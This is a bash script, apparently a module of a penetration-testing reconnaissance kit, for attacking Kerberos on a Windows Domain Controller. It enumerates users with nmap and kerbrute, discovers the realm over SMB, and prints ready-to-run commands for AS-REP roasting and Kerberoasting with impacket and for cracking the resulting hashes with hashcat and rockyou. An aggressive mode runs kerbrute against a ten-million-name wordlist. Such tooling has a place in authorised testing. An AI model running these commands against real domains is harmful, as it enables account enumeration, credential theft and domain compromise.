#!/usr/bin/env bash
# recce-service: Kerberos (88) - realm, AS-REP roasting, user enum
. "$(cd "$(dirname "$0")/.." && pwd)/lib.sh"
T="$1"; P="${2:-88}"; [ "$3" = "-a" ] && AGGR=1
svc_start "KERBEROS" "$T" "$P"

find_ "Kerberos (88) => this is a Domain Controller"
nse "$T" "$P" "krb5-enum-users" "realm=${REALM:-}"
REALM="${REALM:-}"
[ -z "$REALM" ] && have nmap && REALM=$(nmap -Pn -p 445 --script smb-os-discovery "$T" 2>/dev/null | grep -oiE 'Domain name: [^ ]+' | awk '{print $3}')
info "realm/domain: ${REALM:-<unknown - set REALM=corp.local>}"

note "AS-REP roast (no creds, users with DONT_REQ_PREAUTH):"
note "  impacket-GetNPUsers $REALM/ -usersfile users.txt -no-pass -dc-ip $T -format hashcat"
note "Kerberoast (needs any domain creds):"
note "  impacket-GetUserSPNs $REALM/user:pass -dc-ip $T -request -outputfile spns.hash"
note "user enum (no creds):  kerbrute userenum -d $REALM --dc $T users.txt"
note "crack:  hashcat -m 18200 (AS-REP)  /  -m 13100 (TGS)  rockyou.txt"

if aggr && have kerbrute && [ -n "$REALM" ]; then
  sec "Kerbrute user enumeration (intrusive)"
  run kerbrute userenum -d "$REALM" --dc "$T" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
else skip_aggr "kerbrute user enumeration (needs REALM + wordlist)"; fi
